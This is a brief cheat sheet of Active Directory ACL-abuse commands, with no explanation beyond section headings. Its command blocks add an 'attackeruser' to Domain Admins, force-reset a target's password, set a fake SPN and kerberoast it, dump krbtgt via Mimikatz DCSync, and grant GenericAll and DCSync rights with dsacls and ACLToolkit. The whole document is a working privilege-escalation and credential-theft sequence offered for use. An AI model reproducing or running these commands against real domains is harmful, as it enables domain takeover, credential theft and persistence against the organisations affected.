# ACL Abuse Tactics

### PowerShell (PowerView / AD Module)
```powershell
Get-ObjectAcl -SamAccountName "targetuser" -ResolveGUIDs
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
Set-DomainUserPassword -Identity "targetuser" -AccountPassword (ConvertTo-SecureString "NewPassword" -AsPlainText -Force)
Set-ADObject -Identity "targetuser" -Set @{servicePrincipalName="fake/spn"}
Get-ADUser targetuser
Get-ADGroup "groupname"
```

### Rubeus
```powershell
Rubeus.exe kerberoast /spn:fake/spn /domain:domain.local /outfile:hashes.txt
```

### Mimikatz
```powershell
lsadump::dcsync /domain:domain.local /user:krbtgt
```

### Windows Command Line
```cmd
Dsacls "DC=domain,DC=local" /grant "attackeruser:RPWP;user"
```

### ACLToolkit
```powershell
acltoolkit.exe give-genericall -target "CN=targetuser,DC=domain,DC=local" -principal "attackeruser@domain.local"
acltoolkit.exe give-dcsync -target "DC=domain,DC=local" -principal "attackeruser@domain.local"
acltoolkit.exe add-groupmember -target "CN=groupname,DC=domain,DC=local" -principal "attackeruser@domain.local"
```
